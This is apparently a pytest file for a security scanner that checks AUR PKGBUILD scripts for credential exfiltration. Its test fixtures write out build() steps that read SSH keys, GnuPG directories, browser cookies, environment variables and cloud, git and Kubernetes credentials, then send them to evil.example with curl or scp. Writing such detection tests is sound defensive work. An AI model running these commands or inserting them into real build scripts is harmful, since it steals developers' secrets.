from __future__ import annotations

from aurmanager.rules.exfiltration import (
    EXF001SshKeyExfiltration,
    EXF002GnupgExfiltration,
    EXF003BrowserCredentialExfiltration,
    EXF004EnvironmentExfiltration,
    EXF005DeveloperCloudCredentialExfiltration,
)


def test_exf001_fires_on_ssh_key_read_plus_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cat ~/.ssh/id_rsa > /tmp/k
          curl -s -d @/tmp/k https://evil.example/collect
        }
        """
    )
    findings = list(EXF001SshKeyExfiltration().check(ctx))
    assert len(findings) == 1
    assert findings[0].severity.name == "CRITICAL"


def test_exf001_does_not_fire_on_read_without_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cat ~/.ssh/config
        }
        """
    )
    assert list(EXF001SshKeyExfiltration().check(ctx)) == []


def test_exf002_fires_on_gnupg_dir_without_trailing_slash(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          tar czf /tmp/g.tar.gz ~/.gnupg
          curl -F "file=@/tmp/g.tar.gz" https://evil.example/collect
        }
        """
    )
    assert len(list(EXF002GnupgExfiltration().check(ctx))) == 1


def test_exf003_fires_on_browser_cookie_store_read_plus_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cat ~/.mozilla/firefox/xxx.default/cookies.sqlite > /tmp/c
          curl -s -d @/tmp/c https://evil.example/collect
        }
        """
    )
    assert len(list(EXF003BrowserCredentialExfiltration().check(ctx))) == 1


def test_exf004_fires_on_env_dump_plus_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          env > /tmp/e
          curl -s -d @/tmp/e https://evil.example/collect
        }
        """
    )
    assert len(list(EXF004EnvironmentExfiltration().check(ctx))) == 1


def test_exf005_fires_on_aws_and_docker_credential_read_plus_upload(make_pkgbuild_ctx):
    # Modeled on the 2026 Atomic Arch infostealer's documented credential theft
    # ("SSH keys, and GitHub/npm/cloud/Docker tokens") -- the cloud/Docker half
    # of that, not covered by EXF001's SSH-specific pattern.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cat ~/.aws/credentials ~/.docker/config.json > /tmp/loot
          curl -F "data=@/tmp/loot" https://evil.example/collect
        }
        """
    )
    findings = list(EXF005DeveloperCloudCredentialExfiltration().check(ctx))
    assert len(findings) == 1
    assert findings[0].severity.name == "CRITICAL"


def test_exf005_fires_on_git_credentials_read_plus_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cp ~/.git-credentials /tmp/g
          curl -s -d @/tmp/g https://evil.example/collect
        }
        """
    )
    assert len(list(EXF005DeveloperCloudCredentialExfiltration().check(ctx))) == 1


def test_exf005_fires_on_kubeconfig_read_plus_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cat ~/.kube/config > /tmp/k
          curl -s -d @/tmp/k https://evil.example/collect
        }
        """
    )
    assert len(list(EXF005DeveloperCloudCredentialExfiltration().check(ctx))) == 1


def test_exf005_fires_on_scp_exfiltrating_aws_credentials(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          scp ~/.aws/credentials attacker@evil.example:/tmp/loot
          curl -s -d @/tmp/loot https://evil.example/notify
        }
        """
    )
    assert len(list(EXF005DeveloperCloudCredentialExfiltration().check(ctx))) == 1


def test_exf005_does_not_fire_when_scp_writes_to_credential_path(make_pkgbuild_ctx):
    # Regression: scp/rsync are directional (`cmd [opts] source... dest`, dest
    # always last) -- restoring a credentials file FROM a remote backup has
    # the credential path as the destination, not something being read and
    # exfiltrated, and must not fire even alongside an unrelated network call.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          scp backup.zip user@legit.example:~/.aws/credentials
          curl -s -d @/tmp/unrelated https://legit.example/notify
        }
        """
    )
    assert list(EXF005DeveloperCloudCredentialExfiltration().check(ctx)) == []


def test_exf005_does_not_fire_on_read_without_upload(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cat ~/.npmrc
          npm run build
        }
        """
    )
    assert list(EXF005DeveloperCloudCredentialExfiltration().check(ctx)) == []
